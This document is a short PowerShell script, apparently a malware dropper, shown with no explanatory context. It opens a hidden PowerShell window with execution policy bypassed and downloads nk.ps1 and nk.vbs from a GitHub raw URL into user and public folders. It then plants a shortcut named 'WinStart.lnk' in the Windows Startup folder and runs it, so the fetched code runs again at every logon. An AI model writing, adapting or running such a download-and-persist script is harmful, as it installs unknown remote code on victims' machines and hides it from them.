cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
$LocalPath = "$env:LOCALAPPDATA"
$StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$PublicLibPath = "C:\Users\Public"

# File URLs
$File1Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/nk.ps1"
$File2Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/nk.vbs"

# File names
$File1Name = "nk.ps1"
$File2Name = "nk.vbs"

# Full paths to save the files
$File1Path = Join-Path -Path $LocalPath -ChildPath $File1Name
$File2Path = Join-Path -Path $PublicLibPath -ChildPath $File2Name

# Download nk.ps1
Invoke-WebRequest -Uri $File1Url -OutFile $File1Path

# Download nk.vbs and save to Public
Invoke-WebRequest -Uri $File2Url -OutFile $File2Path

# Create shortcut in Startup to run nk.vbs from Public
$ShortcutPath = Join-Path -Path $StartupPath -ChildPath "WinStart.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $File2Path
$Shortcut.Save()

# Execute shortcut
Start-Process $ShortcutPath
